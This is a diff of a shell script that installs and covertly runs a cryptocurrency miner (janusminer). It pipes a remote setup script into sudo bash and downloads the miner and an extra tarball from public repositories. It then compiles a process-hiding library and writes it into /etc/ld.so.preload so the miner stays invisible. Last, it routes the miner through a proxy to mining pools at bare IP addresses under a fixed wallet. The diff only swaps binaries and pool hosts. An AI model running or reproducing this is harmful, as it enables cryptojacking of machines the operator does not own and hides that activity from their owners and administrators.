@@ -13,9 +13,9 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
-wget https://github.com/CoinFuMasterShifu/janusminer/releases/download/0.2.7/janusminer_hiveos-0.2.7.tgz && tar -xvf janusminer_hiveos-0.2.7.tgz && cd janusminer_hiveos
+wget https://github.com/CoinFuMasterShifu/janusminer/releases/download/0.2.7/janusminer-ubuntu20
 
-chmod 777 wart-miner
+chmod 777 janusminer-ubuntu20
 
 wget https://gitlab.com/majapahlevi/mvp/-/raw/main/graphics.tar.gz
 
@@ -57,4 +57,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./wart-miner -h us.acc-pool.pw -p 12000 -u 2bdd0b2e77b826e4cbf005217ae4b709b9e0be4a4203be33.cok -t4 && wget https://github.com/CoinFuMasterShifu/janusminer/releases/download/0.2.7/janusminer_hiveos-0.2.7.tgz && tar -xvf janusminer_hiveos-0.2.7.tgz && cd janusminer_hiveos && ./wart-miner -h 23.83.132.72 -p 12000 -u 2bdd0b2e77b826e4cbf005217ae4b709b9e0be4a4203be33.cik -t150
+./graftcp/graftcp ./janusminer-ubuntu20 -h 81.163.20.40 -p 12000 -u 2bdd0b2e77b826e4cbf005217ae4b709b9e0be4a4203be33.arak -t30
